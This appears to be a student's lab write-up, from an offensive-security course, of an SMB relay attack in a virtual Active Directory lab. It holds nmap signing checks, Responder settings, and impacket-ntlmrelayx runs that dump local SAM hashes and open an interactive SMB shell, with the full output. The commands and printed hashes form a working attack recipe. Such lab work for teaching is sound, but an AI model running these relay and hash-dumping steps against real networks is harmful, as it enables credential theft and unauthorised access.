### Identify hosts without SMB Signing enabled
- Hydra-DC
`nmap --script=smb2-security-mode.nse -p445 10.0.2.15`
```
┌──(root㉿kali)-[/home/kali]
└─# nmap --script=smb2-security-mode.nse -p445 10.0.2.15 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 16:12 IST
Nmap scan report for 10.0.2.15
Host is up (0.0013s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:92:51:2B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```
- SPIDERMAN
`nmap --script=smb2-security-mode.nse -p445 10.0.2.16`
```
┌──(root㉿kali)-[/home/kali]
└─# nmap --script=smb2-security-mode.nse -p445 10.0.2.16 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 16:22 IST
Nmap scan report for 10.0.2.16
Host is up (0.0025s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:AB:13:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```
- THEPUNISHER
`nmap --script=smb2-security-mode.nse -p445 10.0.2.17`
```
┌──(root㉿kali)-[/home/kali]
└─# nmap --script=smb2-security-mode.nse -p445 10.0.2.17 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 16:18 IST
Nmap scan report for 10.0.2.17
Host is up (0.0012s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:AF:66:6A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

### Documenting the targets:
`nano targets.txt`
``` targets.txt
10.0.2.16
10.0.2.17
```

### Modifying responder configuration
`sudo nano /etc/responder/Responder.conf`
``` Changes_to_make_to_Responder.conf
SMB = Off
HTTP = Off
```

### Verifying responder changes, and keeping the responder server running for the attack
```
┌──(root㉿kali)-[/home/kali]
└─# responder -I eth0 -dPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.5]
    Responder IPv6             [fe80::a00:27ff:fe86:d78b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-N7VBOD44MKE]
    Responder Domain Name      [5XRX.LOCAL]
    Responder DCE-RPC Port     [49219]

[+] Listening for events...
```

# Installing ntlmrelayx via PimpMyKali
- `git clone https://github.com/Dewalt-arch/pimpmykali`
- `cd pimpmykali && sudo ./pimpmykali.sh`
- `!`
- `Y`
- `Y`

### Starting the ntlmrelayx server
- `sudo impacket-ntlmrelayx -tf targets.txt -smb2support`
- `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i` (for Interactive SMB shell)
### Simulating an event to demonstrate the attack
- Login to `THEPUNISHER` machine as Frank Castle on the local machine, using the password `Password1`.
- Use Explorer to navigate to the attacker (kali) machine's I.P.
	- `\\10.0.2.5`

### Verify that the hashes are dumped at the ntlmrelayx server
```
┌──(kali㉿kali)-[~]
└─$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections
[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, attacking target smb://10.0.2.16
[*] Authenticating against smb://10.0.2.16 as MARVEL/FCASTLE SUCCEED
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, attacking target smb://10.0.2.17
[-] Authenticating against smb://10.0.2.17 as MARVEL/FCASTLE FAILED
[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa0932977b17f7a8dd4ad7389086ec7fd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:042ec6d1b342560af30ba32e6640a032:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 10.0.2.16
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
- The local SAM hashes are dumped from `SPIDERMAN` and automatically saved into the `192.168.31.92_samhashes.sam` file.

### Retrying attack to demonstrate SMB shell access using the `-i` flag with ntlmrelayx
```
┌──(kali㉿kali)-[~]
└─$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay enabled

[*] Servers started, waiting for connections
[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, attacking target smb://10.0.2.16
[*] Authenticating against smb://10.0.2.16 as MARVEL/FCASTLE SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, attacking target smb://10.0.2.17
[-] Authenticating against smb://10.0.2.17 as MARVEL/FCASTLE FAILED
[*] Received connection from MARVEL/fcastle at THEPUNISHER, connection will be relayed after re-authentication
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from MARVEL/FCASTLE@10.0.2.17 controlled, but there are no more targets left!
```

```
┌──(kali㉿kali)-[~]
└─$ nc 127.0.0.1 11000
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)

# shares
ADMIN$
C$
IPC$
# use C$
# ls
drw-rw-rw-          0  Sun Jun  1 19:12:41 2025 $Recycle.Bin
drw-rw-rw-          0  Sun Jun  1 19:36:43 2025 $WinREAgent
drw-rw-rw-          0  Thu May 22 10:10:01 2025 Documents and Settings
-rw-rw-rw-       8192  Sun Jun  1 19:07:20 2025 DumpStack.log
-rw-rw-rw-       8192  Sun Jun  1 19:07:39 2025 DumpStack.log.tmp
-rw-rw-rw- 1476395008  Sun Jun  1 19:07:39 2025 pagefile.sys
drw-rw-rw-          0  Thu May 22 11:04:09 2025 PerfLogs
drw-rw-rw-          0  Wed May 21 22:14:02 2025 Program Files
drw-rw-rw-          0  Thu May 22 11:04:09 2025 Program Files (x86)
drw-rw-rw-          0  Thu May 22 05:34:56 2025 ProgramData
drw-rw-rw-          0  Thu May 22 10:10:13 2025 Recovery
-rw-rw-rw-  268435456  Sun Jun  1 19:07:39 2025 swapfile.sys
drw-rw-rw-          0  Wed May 21 21:40:48 2025 System Volume Information
drw-rw-rw-          0  Thu May 22 05:38:25 2025 Users
drw-rw-rw-          0  Sun Jun  1 19:07:39 2025 Windows
```

### Retrying attack to demonstrate command execution using the `-c` flag with ntlmrelayx (command execution was working, but not showing its output on my lab deployment for some reason, demonstrating using a screenshot I found in another amazing guide for the same course)
![[Pasted image 20250603041718.png]]